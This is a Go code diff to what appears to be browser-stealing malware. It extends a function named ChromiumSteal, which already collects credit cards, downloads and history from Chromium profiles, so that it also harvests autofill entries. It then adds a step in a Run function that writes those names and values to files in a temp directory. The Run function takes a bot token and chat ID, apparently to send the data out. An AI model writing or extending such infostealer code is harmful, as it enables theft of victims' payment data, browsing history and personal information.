@@ -68,6 +68,7 @@ func ChromiumSteal() []Profile {
 				profile.CreditCards, _ = c.GetCreditCards(profile.Path)
 				profile.Downloads, _ = c.GetDownloads(profile.Path)
 				profile.History, _ = c.GetHistory(profile.Path)
+				profile.Autofill, _ = c.GetAutofills(profile.Path)
 				prof = append(prof, profile)
 			}
 
@@ -201,6 +202,13 @@ func Run(botToken, chatId string) {
 			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", "title", "url"))
 			for _, history := range profile.History {
 				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", history.Title, history.URL))
+			}
+		}
+
+		if len(profile.Autofill) > 0 {
+			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "autofill.txt"), fmt.Sprintf("%-70s %-70s", "name", "value"))
+			for _, autofill := range profile.Autofill {
+				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "autofill.txt"), fmt.Sprintf("%-70s %-70s", autofill.Name, autofill.Value))
 			}
 		}
 
